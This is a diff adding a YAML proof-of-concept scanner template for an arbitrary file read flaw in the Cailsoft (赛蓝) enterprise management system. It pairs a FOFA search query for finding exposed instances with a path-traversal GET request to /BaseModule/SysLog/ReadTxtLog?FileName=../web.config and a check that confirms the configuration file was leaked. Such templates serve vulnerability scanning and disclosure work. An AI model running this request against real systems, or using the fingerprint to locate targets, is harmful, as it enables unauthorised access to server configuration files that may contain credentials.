@@ -1,0 +1,16 @@
+id: poc-yaml-cailsoft-syslog-readtxtlog-any-fileread
+info:
+  name: 赛蓝企业管理系统ReadTxtLog 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 企业管理系统
+  fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+requests:
+- method: GET
+  path: /BaseModule/SysLog/ReadTxtLog?FileName=../web.config
+  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(body,\"\
+    <?xml version=\") &&\ncontains(body,\"<configSections>\") &&\ncontains(body,\"\
+    system.webServer\")\n"
+variables: {}
+transport: http
